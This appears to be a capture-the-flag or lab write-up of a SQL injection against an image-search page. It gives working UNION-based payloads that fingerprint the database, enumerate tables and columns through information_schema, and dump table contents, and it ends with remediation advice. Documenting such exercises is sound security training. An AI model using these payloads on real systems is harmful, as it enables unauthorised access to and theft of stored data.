Exploit: SQL Injection – searchimg
=================================

Description
-----------
An SQL injection attack happens when an attacker is able to manipulate and execute
SQL queries that they are not supposed to. This is typically done by inserting malicious SQL code
into input fields that are used to construct SQL queries.

Scenario
--------
This application provides a feature to search for images using an `id` parameter:

```
    http://192.168.1.43/?page=searchimg&id=3&Submit=Submit
```

By manually changing the `id` value, it is possible to enumerate the images, which
suggests that the parameter is used directly in a SQL query without validation.

When adding a condition that always evaluates to false, the page stopped
returning results:

```
    http://192.168.1.43/?page=searchimg&id=id=1 AND 1=2&Submit=Submit
```
    
This behavior suggest that the input is evaluated by the database directly.

```
    http://192.168.1.43/?page=searchimg&id=id=1 AND 1=1&Submit=Submit
```

This query loads all the images at once, confirming that the input is used in a SQL query
**and** leaking all the images stored in the database.


Single-value SQL functions were injected to gather information about the database:

    id=0 UNION SELECT 1, version()
    id=0 UNION SELECT 1, database()

This revealed:
- Database engine: MariaDB
- Database name: Member_images

Enumerating tables
------------------
The database schema was enumerated using `information_schema.tables`, filtered
to the current database:

    id=0 UNION SELECT 1,(SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1 OFFSET 0)&Submit=Submit

Incrementing the OFFSET allowed enumeration of tables belonging to the
`Member_images` database.

This led to the discovery of the table:

    list_images

Enumerating columns
-------------------
The columns of the `list_images` table were enumerated using
`information_schema.columns`:

    &id=1 UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573&Submit=Submit

Important: the table name `list_images` was provided as a hexadecimal literal to avoid issues with quotes.

This revealed multiple columns, including:
- id
- url
- title
- comment

Dumping table content
---------------------
Once column names were known, the table content could be extracted directly:

    id=0 UNION SELECT title, url FROM list_images&Submit=Submit
    id=0 UNION SELECT comment, url FROM list_images&Submit=Submit

One of the extracted rows contained a comment with explicit instructions and
a hashed value, which constituted the challenge payload.

Possible solutions
------------------
- Use prepared statements (parameterised queries)
- Validate and sanitise all user inputs
- Restrict database permissions to the minimum required
- Disable detailed SQL error messages in production

Sources
-------
- https://owasp.org/www-community/attacks/SQL_Injection
